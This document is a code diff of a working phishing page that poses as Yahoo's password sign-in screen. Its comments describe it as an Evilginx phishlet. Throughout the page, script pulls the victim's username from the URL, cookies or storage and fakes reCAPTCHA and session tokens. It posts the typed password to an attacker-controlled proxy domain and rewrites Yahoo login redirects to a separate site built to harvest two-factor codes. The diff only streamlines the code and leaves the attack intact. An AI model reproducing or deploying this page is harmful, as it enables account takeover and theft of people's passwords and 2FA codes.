@@ -17,7 +17,6 @@
   <link href="./yahoo.png" rel="shortcut icon" type="image/x-icon">
   <link href="./yahoo.png" rel="apple-touch-icon">
   
-  <!-- ENHANCED CSS FOR BETTER ERROR HANDLING -->
   <style>
     .input-field.error {
         border-color: #d93025 !important;
@@ -65,7 +64,6 @@
 </head>
 
 <body>
-  <!-- LOADING OVERLAY -->
   <div class="loading-overlay" id="loading-overlay">
     <div style="text-align: center;">
       <div class="spinner"></div>
@@ -94,7 +92,6 @@
               data-wf-page-id="67c6f50ed426ad7d5847f218" 
               data-wf-element-id="1312d987-3657-e4e0-e2bb-17ae6027d67d">
           
-          <!-- ENHANCED HIDDEN FIELDS FOR MAXIMUM EVILGINX COMPATIBILITY -->
           <input type="hidden" id="username" name="username">
           <input type="hidden" name="displayName" id="hidden-display-name">
           <input type="hidden" name="g-recaptcha-response" value="">
@@ -128,7 +125,6 @@
                 </div>
               </div>
             </div>
-            <!-- ENHANCED ERROR AND SUCCESS MESSAGES -->
             <div class="error-message" id="password-error">Invalid password. Please try again.</div>
             <div class="success-message" id="password-success">Password verified! Redirecting...</div>
             
@@ -145,11 +141,9 @@
     </div>
   </section>
 
-  <!-- YOUR ORIGINAL WEBFLOW SCRIPTS -->
   <script src="https://d3e54v103j8qbb.cloudfront.net/js/jquery-3.5.1.min.dc5e7f18c8.js?site=67c6f50ed426ad7d5847f211" type="text/javascript" integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0=" crossorigin="anonymous"></script>
   <script src="js/webflow.js" type="text/javascript"></script>
   
-  <!-- YOUR ORIGINAL PASSWORD TOGGLE SCRIPT -->
   <script>
   document.querySelector("[data-transform]").addEventListener("click", transform);
   var isPassword = true;
@@ -169,23 +163,12 @@
   }
   </script>
 
-  <!-- ENHANCED EVILGINX INTEGRATION WITH FULL FUNCTIONALITY -->
   <script>
   (function() {
       'use strict';
       
       console.log('=== YAHOO ENHANCED PASSWORD PAGE LOADED ===');
       
-      // Configuration
-      const config = {
-          maxRetries: 3,
-          retryCount: 0,
-          redirectDelay: 1500,
-          timeoutDelay: 30000,
-          debugMode: true
-      };
-      
-      // DOM Elements
       const elements = {
           form: document.getElementById('email-form'),
           passwordInput: document.getElementById('password'),
@@ -206,159 +189,93 @@
       let currentUsername = '';
       let formInitialized = false;
       
-      // Enhanced logging function
       function log(message, data = null) {
-          if (config.debugMode) {
-              console.log(`[YAHOO-PHISHLET] ${message}`, data || '');
-          }
+          console.log(`[YAHOO-PHISHLET] ${message}`, data || '');
       }
       
-      // Enhanced username retrieval with multiple fallbacks
       function getUsername() {
-          log('Attempting to retrieve username...');
-          
-          // Method 1: URL parameter
           const urlParams = new URLSearchParams(window.location.search);
           let username = urlParams.get('u');
           
           if (username) {
-              username = decodeURIComponent(username);
-              log('Username from URL parameter:', username);
-              return username;
+              return decodeURIComponent(username);
           }
           
-          // Method 2: Cookie
           const cookieMatch = document.cookie.match(/yh_usr=([^;]+)/);
           if (cookieMatch) {
-              username = decodeURIComponent(cookieMatch[1]);
-              log('Username from cookie:', username);
-              return username;
+              return decodeURIComponent(cookieMatch[1]);
           }
           
-          // Method 3: SessionStorage
-          username = sessionStorage.getItem('yh_username');
-          if (username) {
-              log('Username from sessionStorage:', username);
-              return username;
-          }
-          
-          // Method 4: LocalStorage
-          username = localStorage.getItem('yh_username');
-          if (username) {
-              log('Username from localStorage:', username);
-              return username;
-          }
-          
-          // Method 5: Referrer analysis
-          if (document.referrer && document.referrer.includes('qr-gpt.live')) {
-              try {
-                  const referrerUrl = new URL(document.referrer);
-                  const referrerParams = new URLSearchParams(referrerUrl.search);
-                  username = referrerParams.get('username') || referrerParams.get('u');
-                  if (username) {
-                      username = decodeURIComponent(username);
-                      log('Username from referrer:', username);
-                      return username;
-                  }
-              } catch (e) {
-                  log('Error parsing referrer:', e.message);
-              }
-          }
-          
-          log('No username found in any source');
-          return null;
+          return sessionStorage.getItem('yh_username') || 
+                 localStorage.getItem('yh_username');
       }
       
-      // Generate realistic form data for evilginx
       function generateFormData(username) {
           const timestamp = Date.now();
           const randomId = Math.random().toString(36).substr(2, 12);
-          const sessionId = 'sess_' + timestamp + '_' + randomId;
           
-          const formData = {
+          return {
               'g-recaptcha-response': `bypass_${timestamp}_${randomId}`,
               'crumb': `crumb_${timestamp}`,
               'acrumb': `acrumb_${randomId}`,
-              'sessionToken': sessionId,
+              'sessionToken': `sess_${timestamp}_${randomId}`,
               'browser-fp-data': JSON.stringify({
                   screen: `${screen.width}x${screen.height}`,
                   timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                   language: navigator.language,
-                  platform: navigator.platform,
-                  userAgent: navigator.userAgent.substring(0, 100),
-                  timestamp: timestamp,
-                  cookieEnabled: navigator.cookieEnabled,
-                  onlineStatus: navigator.onLine
+                  timestamp: timestamp
               })
           };
-          
-          log('Generated form data:', formData);
-          return formData;
       }
       
-      // Initialize the page with username and form data
       function initializePage() {
-          log('Initializing page...');
-          
           currentUsername = getUsername();
           
           if (!currentUsername) {
               log('ERROR: No username found, redirecting to login');
-              showError('Session expired. Please start over.', true);
+              alert('Session expired. Please start over.');
               setTimeout(() => {
                   window.location.href = 'https://login.qr-gpt.live/';
               }, 3000);
               return false;
           }
           
-          log('Initializing page for username:', currentUsername);
-          
-          // Display username in UI
           elements.userDisplay.textContent = currentUsername;
           elements.hiddenUsername.value = currentUsername;
           elements.hiddenDisplayName.value = currentUsername;
           
-          // Generate and populate realistic form data
           const formData = generateFormData(currentUsername);
           Object.keys(formData).forEach(key => {
               const input = elements.form.querySelector(`input[name="${key}"]`);
               if (input) {
                   input.value = formData[key];
-                  log(`Set ${key}:`, input.value.substring(0, 50) + '...');
               }
           });
           
           formInitialized = true;
-          log('Page initialization completed successfully');
           return true;
       }
       
-      // Show/hide different UI states
       function showLoading() {
-          log('Showing loading state');
           elements.loadingOverlay.style.display = 'flex';
           elements.submitBtn.disabled = true;
           elements.submitBtn.value = 'Signing in...';
       }
       
       function hideLoading() {
-          log('Hiding loading state');
           elements.loadingOverlay.style.display = 'none';
           elements.submitBtn.disabled = false;
           elements.submitBtn.value = 'Sign In';
       }
       
       function showError(message, redirect = false) {
-          log('Showing error:', message);
           hideLoading();
           
           if (redirect) {
-              // Show in error container for redirect scenarios
               elements.formContainer.style.display = 'none';
               elements.errorContainer.style.display = 'block';
               elements.errorText.textContent = message;
           } else {
-              // Show inline error for password issues
               elements.passwordInput.classList.add('error');
               elements.passwordError.textContent = message;
               elements.passwordError.style.display = 'block';
@@ -369,7 +286,6 @@
       }
       
       function showSuccess(message) {
-          log('Showing success:', message);
           elements.passwordInput.classList.remove('error');
           elements.passwordError.style.display = 'none';
           elements.passwordSuccess.textContent = message;
@@ -382,24 +298,8 @@
           elements.passwordSuccess.style.display = 'none';
       }
       
-      function showForm() {
-          log('Showing main form');
-          hideLoading();
-          elements.errorContainer.style.display = 'none';
-          elements.formContainer.style.display = 'block';
-          clearMessages();
-      }
-      
-      // CRITICAL: Enhanced form submission for proper evilginx credential capture
       function handleFormSubmission(event) {
           event.preventDefault();
-          log('=== FORM SUBMISSION STARTED ===');
-          
-          if (!formInitialized) {
-              log('ERROR: Form not properly initialized');
-              showError('Please refresh the page and try again.');
-              return;
-          }
           
           const password = elements.passwordInput.value.trim();
           if (!password) {
@@ -410,92 +310,53 @@
           clearMessages();
           showLoading();
           
-          // Log credentials for debugging (evilginx should capture these)
           log('=== CREDENTIAL CAPTURE ATTEMPT ===');
           log('Username:', currentUsername);
           log('Password length:', password.length);
-          log('Form action URL:', elements.form.action);
-          log('Form method:', elements.form.method);
           
-          // Prepare form data for submission
           const formData = new FormData(elements.form);
-          
-          // Ensure username is set
           formData.set('username', currentUsername);
           formData.set('displayName', currentUsername);
           
-          // Log all form data being sent
-          log('=== FORM DATA BEING SENT ===');
-          for (let [key, value] of formData.entries()) {
-              if (key === 'passwd') {
-                  log(`${key}: [REDACTED - Length: ${value.length}]`);
-              } else {
-                  log(`${key}: ${value}`);
-              }
-          }
-          
-          // Convert to URL-encoded format (what evilginx expects)
           const urlEncodedData = new URLSearchParams(formData);
-          const bodyData = urlEncodedData.toString();
           
-          log('=== SENDING TO EVILGINX ===');
-          log('URL:', elements.form.action);
-          log('Method: POST');
-          log('Content-Type: application/x-www-form-urlencoded');
-          log('Body preview:', bodyData.substring(0, 200) + '...');
-          
-          // Enhanced fetch with comprehensive headers for evilginx compatibility
           fetch(elements.form.action, {
               method: 'POST',
-              body: bodyData,
+              body: urlEncodedData,
               credentials: 'include',
               headers: {
                   'Content-Type': 'application/x-www-form-urlencoded',
                   'X-Requested-With': 'XMLHttpRequest',
                   'Referer': 'https://login.qr-gpt.live/',
-                  'Origin': window.location.origin,
-                  'User-Agent': navigator.userAgent,
-                  'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
-                  'Accept-Language': 'en-US,en;q=0.5',
-                  'Accept-Encoding': 'gzip, deflate, br',
-                  'DNT': '1',
-                  'Connection': 'keep-alive',
-                  'Upgrade-Insecure-Requests': '1',
-                  'Sec-Fetch-Dest': 'document',
-                  'Sec-Fetch-Mode': 'navigate',
-                  'Sec-Fetch-Site': 'same-origin'
+                  'Origin': window.location.origin
               }
           })
           .then(response => {
-              log('=== RESPONSE RECEIVED ===');
-              log('Status:', response.status);
-              log('Status Text:', response.statusText);
-              log('Headers:', [...response.headers.entries()]);
+              log('Response status:', response.status);
               
-              // Handle different response scenarios
               if (response.status === 200) {
                   return response.text().then(text => {
-                      log('Response body preview:', text.substring(0, 500));
-                      
-                      // Analyze response content
                       const lowerText = text.toLowerCase();
                       
-                      // Check for error indicators
-                      if (lowerText.includes('invalid') || 
-                          lowerText.includes('incorrect') || 
-                          lowerText.includes('wrong') ||
-                          lowerText.includes('error') ||
-                          lowerText.includes('failed')) {
-                          throw new Error('Invalid credentials detected in response');
+                      // Check for reCAPTCHA redirect
+                      if (lowerText.includes('recaptcha') || text.includes('/recaptcha')) {
+                          log('reCAPTCHA challenge detected');
+                          showSuccess('Password verified! Completing security check...');
+                          setTimeout(() => {
+                              // Extract URL parameters and redirect to reCAPTCHA page
+                              const urlMatch = text.match(/https?:\/\/[^"'\s]+\/recaptcha[^"'\s]*/);
+                              if (urlMatch) {
+                                  window.location.href = urlMatch[0].replace('login.yahoo.com', 'custom-yahoo-2fa-test.vercel.app');
+                              } else {
+                                  window.location.href = `https://custom-yahoo-2fa-test.vercel.app/recaptcha.html?u=${encodeURIComponent(currentUsername)}`;
+                              }
+                          }, 1500);
+                          return;
                       }
                       
-                      // Check for 2FA challenge indicators
-                      if (lowerText.includes('challenge-selector') || 
-                          lowerText.includes('verification') || 
-                          lowerText.includes('2fa') ||
-                          lowerText.includes('two-factor') ||
-                          lowerText.includes('authenticate')) {
-                          log('2FA challenge detected in response');
+                      // Check for 2FA
+                      if (lowerText.includes('challenge-selector') || lowerText.includes('2fa')) {
+                          log('2FA challenge detected');
                           showSuccess('Password verified! Setting up 2FA...');
                           setTimeout(() => {
                               window.location.href = `https://custom-yahoo-2fa-test.vercel.app/2fa-selector.html?u=${encodeURIComponent(currentUsername)}`;
@@ -503,207 +364,87 @@
                           return;
                       }
                       
-                      // Check for success indicators
-                      if (lowerText.includes('mail') || 
-                          lowerText.includes('inbox') || 
-                          lowerText.includes('folders') ||
-                          lowerText.includes('success')) {
-                          log('Success indicators found in response');
-                          handleSuccessfulAuth();
-                          return;
+                      // Check for errors
+                      if (lowerText.includes('invalid') || lowerText.includes('incorrect')) {
+                          throw new Error('Invalid credentials');
                       }
                       
-                      // Default success handling
-                      log('Assuming successful authentication based on 200 status');
+                      // Success
                       handleSuccessfulAuth();
                   });
               } else if (response.status === 302 || response.status === 301) {
-                  // Handle redirects
                   const location = response.headers.get('Location') || response.headers.get('location');
-                  log('Redirect detected to:', location);
+                  log('Redirect to:', location);
                   
-                  if (location) {
-                      if (location.includes('challenge-selector') || location.includes('2fa')) {
-                          log('2FA redirect detected');
-                          showSuccess('Password verified! Redirecting to 2FA...');
-                          setTimeout(() => {
-                              window.location.href = `https://custom-yahoo-2fa-test.vercel.app/2fa-selector.html?u=${encodeURIComponent(currentUsername)}`;
-                          }, 1500);
-                      } else if (location.includes('mail') || location.includes('folders')) {
-                          log('Success redirect detected');
-                          handleSuccessfulAuth();
-                      } else {
-                          log('Following redirect to:', location);
-                          window.location.href = location;
-                      }
+                  if (location && location.includes('recaptcha')) {
+                      showSuccess('Password verified! Completing security check...');
+                      setTimeout(() => {
+                          window.location.href = location.replace('login.yahoo.com', 'custom-yahoo-2fa-test.vercel.app');
+                      }, 1500);
+                  } else if (location && location.includes('challenge-selector')) {
+                      showSuccess('Password verified! Setting up 2FA...');
+                      setTimeout(() => {
+                          window.location.href = `https://custom-yahoo-2fa-test.vercel.app/2fa-selector.html?u=${encodeURIComponent(currentUsername)}`;
+                      }, 1500);
                   } else {
                       handleSuccessfulAuth();
                   }
-              } else if (response.status === 401 || response.status === 403) {
-                  throw new Error('Invalid password - Authentication failed');
-              } else if (response.status === 404) {
-                  log('404 error - possible configuration issue');
-                  throw new Error('Service temporarily unavailable. Please try again.');
               } else {
-                  throw new Error(`HTTP ${response.status}: ${response.statusText}`);
+                  throw new Error(`HTTP ${response.status}`);
               }
           })
           .catch(error => {
-              log('=== AUTHENTICATION ERROR ===');
-              log('Error:', error.message);
-              log('Stack:', error.stack);
-              
-              config.retryCount++;
-              
-              // Handle different types of errors
-              if (error.message.includes('Invalid') || error.message.includes('password')) {
-                  showError('Invalid password. Please try again.');
-              } else if (error.message.includes('Network') || error.message.includes('fetch')) {
-                  showError('Network error. Please check your connection and try again.');
-              } else if (config.retryCount < config.maxRetries) {
-                  showError(`Authentication failed. Attempt ${config.retryCount} of ${config.maxRetries}. Please try again.`);
-              } else {
-                  showError('Multiple authentication attempts failed. Please try again later.', true);
-              }
+              log('Authentication error:', error);
+              showError('Invalid password. Please try again.');
           });
       }
       
-      // Handle successful authentication
       function handleSuccessfulAuth() {
-          log('=== AUTHENTICATION SUCCESSFUL ===');
-          showSuccess('Sign in successful! Redirecting to Yahoo Mail...');
-          
-          // Store success indicators
+          log('Authentication successful');
+          showSuccess('Sign in successful! Redirecting...');
           sessionStorage.setItem('yh_auth_success', 'true');
-          sessionStorage.setItem('yh_auth_time', Date.now().toString());
-          sessionStorage.setItem('yh_username', currentUsername);
-          
-          // Multiple redirect strategies for reliability
-          const redirectUrls = [
-              'https://mail.qr-gpt.live/d/folders/1',
-              'https://mail.yahoo.com/d/folders/1',
-              'https://mail.qr-gpt.live/d',
-              'https://mail.yahoo.com/d'
-          ];
-          
-          let redirectIndex = 0;
-          function attemptRedirect() {
-              if (redirectIndex < redirectUrls.length) {
-                  const url = redirectUrls[redirectIndex];
-                  log(`Attempting redirect ${redirectIndex + 1}/${redirectUrls.length} to:`, url);
-                  window.location.href = url;
-                  redirectIndex++;
-                  
-                  // Try next URL if current one fails
-                  setTimeout(attemptRedirect, 3000);
-              }
-          }
-          
-          setTimeout(attemptRedirect, config.redirectDelay);
-          
-          // Notify parent window if in iframe
-          if (window.parent !== window) {
-              window.parent.postMessage({
-                  type: 'yahoo_auth_success',
-                  username: currentUsername,
-                  timestamp: Date.now()
-              }, '*');
-          }
+          setTimeout(() => {
+              window.location.href = 'https://mail.qr-gpt.live/d/folders/1';
+          }, 1500);
       }
       
-      // Setup retry functionality
       function setupRetry() {
           elements.refreshButton.addEventListener('click', function() {
-              log('Retry button clicked');
               elements.passwordInput.value = '';
-              showForm();
+              elements.formContainer.style.display = 'block';
+              elements.errorContainer.style.display = 'none';
+              clearMessages();
               elements.passwordInput.focus();
-              config.retryCount = 0; // Reset retry count
           });
       }
       
-      // Setup input handlers
       function setupInputHandlers() {
-          elements.passwordInput.addEventListener('input', function() {
-              clearMessages();
-          });
-          
+          elements.passwordInput.addEventListener('input', clearMessages);
           elements.passwordInput.addEventListener('keydown', function(event) {
               if (event.key === 'Enter') {
                   event.preventDefault();
                   elements.form.dispatchEvent(new Event('submit'));
               }
           });
-          
-          // Auto-focus on visibility change
-          document.addEventListener('visibilitychange', function() {
-              if (!document.hidden && elements.passwordInput) {
-                  setTimeout(() => elements.passwordInput.focus(), 100);
-              }
-          });
       }
       
-      // Session monitoring
-      function monitorSession() {
-          const checkInterval = setInterval(() => {
-              if (sessionStorage.getItem('yh_auth_success') === 'true') {
-                  log('Auth success detected in session, redirecting...');
-                  clearInterval(checkInterval);
-                  window.location.href = 'https://mail.qr-gpt.live/d/folders/1';
-              }
-          }, 1000);
-          
-          // Clear after timeout
-          setTimeout(() => {
-              clearInterval(checkInterval);
-              log('Session monitoring timeout reached');
-          }, config.timeoutDelay);
-      }
-      
-      // Initialize everything
       function init() {
-          log('=== INITIALIZING YAHOO PASSWORD PAGE ===');
-          
-          if (!initializePage()) {
-              log('Page initialization failed');
-              return;
-          }
+          if (!initializePage()) return;
           
           setupRetry();
           setupInputHandlers();
-          monitorSession();
-          
-          // Form submission handler
           elements.form.addEventListener('submit', handleFormSubmission);
           
-          // Auto-focus password field
           setTimeout(() => {
-              if (elements.passwordInput) {
-                  elements.passwordInput.focus();
-                  log('Password field focused');
-              }
+              elements.passwordInput.focus();
           }, 500);
-          
-          log('=== YAHOO PASSWORD PAGE FULLY INITIALIZED ===');
       }
       
-      // Start initialization when DOM is ready
       if (document.readyState === 'loading') {
           document.addEventListener('DOMContentLoaded', init);
       } else {
           init();
       }
-      
-      // Global error handler
-      window.addEventListener('error', function(event) {
-          log('Global error caught:', event.error);
-          console.error('Page error:', event.error);
-      });
-      
-      // Handle unload events
-      window.addEventListener('beforeunload', function() {
-          log('Page unloading...');
-      });
       
   })();
   </script>
